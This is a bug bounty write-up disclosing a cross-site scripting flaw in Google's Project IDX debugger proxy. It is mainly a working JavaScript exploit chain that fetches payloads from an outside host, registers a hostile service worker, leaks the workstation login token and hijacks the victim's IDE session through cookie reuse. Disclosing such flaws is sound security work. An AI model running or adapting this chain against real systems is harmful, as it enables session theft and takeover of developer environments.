---
title: idx.google.com XSS (Awarded $3133.70)
---

This is a hosted development environment called Project IDX based on [Visual Studio Code](https://github.com/microsoft/vscode) like [Google Cloud Shell](https://cloud.google.com/shell/)

Feature being abused: <https://developers.google.com/idx/guides/debug-in-idx#chrome-devtools>  
Its based of the Chii open source project: <https://github.com/liriliri/chii/commit/0002b761737f450fe070699b6fec284d6e1e91e9>

- Create a project as simple html.
- Once loaded, Take the `ID` from an iframe in the format `https://9000-monospace-<ID>.cloudworkstations.dev` (In a real attack this could be leaked from the network)
- Run the following from any website replacing `ID` with your own ID.

```js
// Vulnerable debugger proxy (Runs any js code you want, Fetch as the victims server)
let target = 'https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=';

// Link to our service worker
let proxy = new URL('https://terjanq.me/xss.php');
proxy.searchParams.set('ct', 'application/javascript');
proxyPayload = `
self.addEventListener("fetch", (event) => {
 let url = event.request.url;
 // Leak token from redirect since its a httponly cookie
  // Authentication is done by:
 // Redirecting the user to https://ssh.cloud.google.com/devshell/gateway/oauth?state=<value> (Cross-site, COOP, embed protection)
 // https://<PORT>-idx-<ID>.cloudworkstations.dev/_workstation/login?redirect=<value> this sets a cookie then redirects back.
 if (url.includes("_workstation/login")) {
  console.info('🎉 Leaked token: '+url);
 }
});
`;
proxy.searchParams.set('html', proxyPayload);

// Link to force a re-authenticate
let reauth = new URL('https://terjanq.me/xss.php');
reauth.searchParams.set('h[Clear-Site-Data]', '"cookies"');
reauthPayload = `
setTimeout(() => { location.href=location.origin }, 3000);
`;
reauth.searchParams.set('js', reauthPayload);

// Link to create service worker
let setup = new URL('https://terjanq.me/xss.php');
setupPayload = `
navigator.serviceWorker.register("${target + encodeURIComponent(proxy.href)}");
setTimeout(() => { location.href="${target + encodeURIComponent(reauth.href)}" }, 3000);
`;
setup.searchParams.set('js', setupPayload);

// Do the stuff
location = target + encodeURIComponent(setup.href);
```

- In the console you should see a message that says "leaked token" of the format `https://8282-monospace-<ID>.cloudworkstations.dev/_workstation/login?redirect=<secret>` in a new browser go to that URL and you will be logged in to the debugger.
- You will have got a `WorkstaionJwt` from that by changing the domain of this cookie for example to `80-monospace-<ID>.cloudworkstations.dev` you can login to the IDE!
